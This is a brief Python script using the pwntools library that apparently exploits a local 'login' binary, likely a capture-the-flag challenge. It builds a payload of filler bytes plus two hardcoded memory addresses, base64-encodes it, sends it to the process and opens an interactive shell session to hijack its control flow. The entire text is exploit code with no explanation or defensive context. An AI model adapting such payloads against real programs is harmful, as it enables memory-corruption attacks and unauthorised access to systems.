from pwn import *
from base64 import *
p = process("./login")
payload = b"a" * 4 + p32(0x08049284) + p32(0x0811EB40)
p.sendline(b64encode(payload))
p.interactive()
